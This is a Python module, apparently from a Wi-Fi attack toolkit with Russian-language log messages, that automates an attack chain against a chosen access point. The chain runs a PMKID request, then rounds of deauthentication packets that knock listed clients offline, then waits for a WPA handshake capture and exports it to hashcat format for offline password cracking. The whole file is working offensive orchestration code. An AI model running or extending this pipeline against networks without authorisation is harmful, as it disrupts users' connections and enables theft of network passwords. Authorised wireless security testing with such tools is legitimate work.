"""Auto-attack workflow pipeline.

Orchestrates the full attack chain: deauth → capture handshake/PMKID → export
to hashcat format. Runs as a background thread and reports progress through
callbacks/events.
"""

from __future__ import annotations

import threading
import time
from enum import Enum, auto
from pathlib import Path
from typing import Callable, List, Optional


class AutoAttackPhase(Enum):
    IDLE = auto()
    LOCKING_CHANNEL = auto()
    DEAUTH = auto()
    WAITING_HANDSHAKE = auto()
    PMKID_REQUEST = auto()
    EXPORTING = auto()
    CRACKING = auto()
    COMPLETE = auto()
    FAILED = auto()


class AutoAttackPipeline:
    """Automated attack workflow: deauth → handshake → export.

    Usage:
        pipeline = AutoAttackPipeline(...)
        pipeline.start(bssid, clients, channel)
        # Progress reported via on_progress callback
        # Completion/failure reported via on_complete callback
    """

    def __init__(
        self,
        interface: str,
        capture_dir: Path,
        on_progress: Optional[Callable[[AutoAttackPhase, str], None]] = None,
        on_complete: Optional[Callable[[bool, str], None]] = None,
        log: Optional[Callable[[str], None]] = None,
        deauth_packets: int = 10,
        deauth_interval: float = 0.5,
        deauth_rounds: int = 5,
        handshake_timeout: float = 30.0,
        try_pmkid_first: bool = True,
    ) -> None:
        self.interface = interface
        self.capture_dir = capture_dir
        self._on_progress = on_progress
        self._on_complete = on_complete
        self._log = log
        self.deauth_packets = deauth_packets
        self.deauth_interval = deauth_interval
        self.deauth_rounds = deauth_rounds
        self.handshake_timeout = handshake_timeout
        self.try_pmkid_first = try_pmkid_first
        self._phase = AutoAttackPhase.IDLE
        self._thread: Optional[threading.Thread] = None
        self._stop_event = threading.Event()
        self._handshake_event = threading.Event()
        self._captured_path: Optional[str] = None

    @property
    def phase(self) -> AutoAttackPhase:
        return self._phase

    def start(self, bssid: str, clients: List[str], channel: Optional[int] = None,
              essid: Optional[str] = None) -> None:
        if self._thread and self._thread.is_alive():
            self.stop()
        self._stop_event.clear()
        self._handshake_event.clear()
        self._captured_path = None
        self._thread = threading.Thread(
            target=self._run,
            args=(bssid, clients, channel, essid),
            daemon=True,
        )
        self._thread.start()

    def stop(self) -> None:
        self._stop_event.set()
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=5)
        self._phase = AutoAttackPhase.IDLE

    def is_running(self) -> bool:
        return self._thread is not None and self._thread.is_alive()

    def notify_handshake(self, capture_path: str) -> None:
        """Called externally when a handshake is captured for the target."""
        self._captured_path = capture_path
        self._handshake_event.set()

    def _run(self, bssid: str, clients: List[str], channel: Optional[int],
             essid: Optional[str]) -> None:
        try:
            # Phase 1: Try PMKID request first (clientless)
            if self.try_pmkid_first:
                self._set_phase(AutoAttackPhase.PMKID_REQUEST, f"Запрос PMKID к {bssid}")
                self._try_pmkid(bssid, essid, channel)
                # Wait briefly for PMKID
                if self._handshake_event.wait(timeout=5.0):
                    self._set_phase(AutoAttackPhase.COMPLETE, "PMKID получен!")
                    self._finish(True, "PMKID успешно перехвачен")
                    return
                if self._stop_event.is_set():
                    return

            # Phase 2: Deauthentication
            if clients:
                for round_num in range(self.deauth_rounds):
                    if self._stop_event.is_set():
                        return
                    if self._handshake_event.is_set():
                        break
                    self._set_phase(
                        AutoAttackPhase.DEAUTH,
                        f"Деаутентификация раунд {round_num + 1}/{self.deauth_rounds}"
                    )
                    self._do_deauth(bssid, clients)

                    # Wait for handshake
                    self._set_phase(AutoAttackPhase.WAITING_HANDSHAKE, "Ожидание handshake...")
                    if self._handshake_event.wait(timeout=self.handshake_timeout / self.deauth_rounds):
                        break

            if self._stop_event.is_set():
                return

            # Phase 3: Check result
            if self._handshake_event.is_set() and self._captured_path:
                self._set_phase(AutoAttackPhase.EXPORTING, "Экспорт в hashcat формат")
                self._export_hashcat(self._captured_path, bssid)
                self._finish(True, f"Handshake захвачен: {self._captured_path}")
            else:
                self._finish(False, "Не удалось перехватить handshake за отведённое время")

        except Exception as exc:  # noqa: BLE001
            self._set_phase(AutoAttackPhase.FAILED, str(exc))
            self._finish(False, f"Ошибка: {exc}")

    def _try_pmkid(self, bssid: str, essid: Optional[str], channel: Optional[int]) -> None:
        try:
            from .pmkid_request import request_pmkid
            request_pmkid(self.interface, bssid, essid=essid or "", channel=channel, log=self._log)
        except Exception as exc:  # noqa: BLE001
            if self._log:
                self._log(f"PMKID запрос не удался: {exc}")

    def _do_deauth(self, bssid: str, clients: List[str]) -> None:
        try:
            from .deauth import DeauthService
            svc = DeauthService(self.interface, log_callback=self._log)
            svc.start(bssid, clients, self.deauth_packets, self.deauth_interval)
            # Wait for deauth to complete its cycle
            time.sleep(self.deauth_interval * 2 + 1.0)
            svc.stop()
        except Exception as exc:  # noqa: BLE001
            if self._log:
                self._log(f"Deauth ошибка: {exc}")

    def _export_hashcat(self, capture_path: str, bssid: str) -> None:
        try:
            from .exporters import HashcatExporter
            exporter = HashcatExporter()
            src = Path(capture_path)
            dst = src.with_suffix(".hc22000")
            exporter.export(src, dst)
            if self._log:
                self._log(f"Экспорт hashcat: {dst}")
        except Exception as exc:  # noqa: BLE001
            if self._log:
                self._log(f"Экспорт не удался: {exc}")

    def _set_phase(self, phase: AutoAttackPhase, message: str) -> None:
        self._phase = phase
        if self._on_progress:
            self._on_progress(phase, message)
        if self._log:
            self._log(f"[auto-attack] {phase.name}: {message}")

    def _finish(self, success: bool, message: str) -> None:
        self._phase = AutoAttackPhase.COMPLETE if success else AutoAttackPhase.FAILED
        if self._on_complete:
            self._on_complete(success, message)
